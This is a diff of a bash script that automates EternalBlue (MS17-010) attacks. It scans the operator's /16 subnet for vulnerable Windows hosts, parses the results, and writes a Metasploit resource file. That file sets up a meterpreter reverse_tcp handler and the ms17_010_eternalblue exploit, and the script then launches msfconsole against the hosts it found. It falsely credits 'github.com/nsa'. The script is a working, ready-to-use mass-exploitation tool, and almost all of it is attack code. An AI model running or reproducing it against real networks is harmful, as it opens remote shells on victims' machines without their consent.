@@ -1,6 +1,8 @@
 #!/usr/bin/env bash
 
-# run as sudo checks
+# author: github.com/nsa
+
+# run as sudo
 # sudo is necessary for scanning eternalblues and 
 # metasploit framework
 echo "Special thanks to";
@@ -12,29 +14,26 @@ echo " |_| \_|_____/_/    \_\ ";
 echo "https://github.com/nsa";
 echo "";
 
+# checks if this script running as sudo or not.
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 1>&2;
    exit 1;
 fi
 
-# cloning scanner from the github repo
-if [ ! -d "eternal_scanner" ]; then
-    git clone https://github.com/peterpt/eternal_scanner.git && cd eternal_scanner;
-    chmod +x escan;
+assetsdir="assets/";
+# cloning eternal_scanner from its github repo
+if [ ! -d "assets/eternal_scanner" ]; then
+    git clone https://github.com/peterpt/eternal_scanner.git "$assetsdir"eternal_scanner;
+    chmod +x assets/eternal_scanner/escan;
 else 
-    cd eternal_scanner;
-    chmod +x escan;
+    chmod +x assets/eternal_scanner/escan;
 fi
 
-# read necessary infos from the user
+# read user IP from user.
 read -p 'YOUR IP: ' yourIP;
 if [ -z $yourIP ]; then
     echo "YOUR IP parameter cannot be empty"; exit 1;
 fi
-
-echo "";
-echo "SCANNER STARTING...";
-echo "";
 
 # parses your ip into ip{1-4}
 ip=$yourIP;
@@ -46,40 +45,51 @@ ip3=${ip%%.*};
 ip=${ip#*.*};
 ip4=${ip%%.*};
 
-./escan -i $ip1.$ip2.0.0/16
+# check whether vuln.txt exists or not
+if [ ! -f /usr/local/share/Eternal_Scanner/vuln.txt ]; then
+    echo "";
+    echo "SCANNER STARTING...";
+    echo "";
+    cd assets/eternal_scanner 
+    ./escan -i $ip1.$ip2.0.0/16
+    cd ../..
+    echo "";
+    echo "Parsing IPs...";
+    python3 "$assetsdir"ipparser.py &
 
-echo "VULNERABLE IP ADRESSES"
-gedit /usr/local/share/Eternal_Scanner/vuln.txt &
+else
+    echo "No scanner needed due to the file ";
+    echo "/usr/local/share/Eternal_Scanner/vuln.txt";
+    echo "vuln.txt FOUND";
+    python3 "$assetsdir"ipparser.py &
+    echo "";
+    echo "Parsing IPs...";
 
+fi
+
+# sets metasploit reverse_tcp port, by default 31313
 read -p 'CONNECTION PORT(default: 31313): ' port;
 if [ -z $port ]; then
     port="31313";
 fi
 
-echo "";
-echo "PLEASE COPY THE TARGET IP";
-echo "";
-
-read -p 'TARGET IP: ' targetIP;
-if [ -z $targetIP ]; then
-    echo "TARGET IP parameter cannot be empty"; exit 1;
-fi
-
-# shows the options
-echo "";
-echo "metasploit console starting with options";
-echo ">> use exploit/windows/smb/ms17_010_eternalblue";
-echo ">> set PAYLOAD windows/x64/meterpreter/reverse_tcp";
-echo ">> set LHOST" $yourIP;
-echo ">> set LPORT" $port;
-echo ">> set RHOST" $targetIP;
+# sets the metasploit options into assets/nsa.rb file
+echo "use exploit/multi/handler" > "$assetsdir"nsa.rb;
+echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> "$assetsdir"nsa.rb;
+echo "set autorunscript multi_console_command -rc assets/nsa.rc" >>"$assetsdir"nsa.rb;
+echo "set lhost" $yourIP >> "$assetsdir"nsa.rb;
+echo "set lport" $port >> "$assetsdir"nsa.rb;
+echo "set ExitOnSession false" >> "$assetsdir"nsa.rb;
+echo "exploit -j" >> "$assetsdir"nsa.rb;
+echo "use exploit/windows/smb/ms17_010_eternalblue" >> "$assetsdir"nsa.rb;
+echo "set VerifyArch false" >> "$assetsdir"nsa.rb;
 
 # if user wants to continue then exploitS
 read -p 'Do you want to proceed(y/n): ' check;
 if [ "$check" == "y" ] || [ "$check" == "yes" ]; then
     echo "";
     echo "Running please wait..."; 
-    msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST $yourIP;set LPORT $port;set RHOST $targetIP;set VerifyArch false;exploit;"
+    msfconsole -r assets/iter.rc
 else
     echo "Not Proceeded, USER EXIT"; exit 1;
 fi
